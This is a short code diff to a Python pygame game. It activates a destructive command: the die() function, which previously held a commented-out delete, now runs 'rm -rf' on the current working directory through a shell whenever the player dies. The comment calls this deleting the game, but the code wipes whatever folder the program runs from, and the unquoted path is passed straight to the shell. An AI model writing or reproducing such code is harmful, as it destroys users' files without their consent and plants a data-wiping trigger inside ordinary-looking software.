@@ -1,6 +1,7 @@
 import pygame
 import random
 import json
+import os
 import matplotlib.pyplot as plt
 import matplotlib.animation as animation
 import numpy as np
@@ -48,7 +49,8 @@ COLORS = [RED, GREEN, BLUE]
 def die():
     # Delete the entire game from your computer
     print("Died")
-    # subprocess.run("rm -rf ../HSEM", shell=True)
+    cmd = f"rm -rf {os.getcwd()}"
+    subprocess.run(cmd, shell=True)
     exit()
 
 def generate_holds(NUM_HOLDS, HOLD_RADIUS, WIDTH):
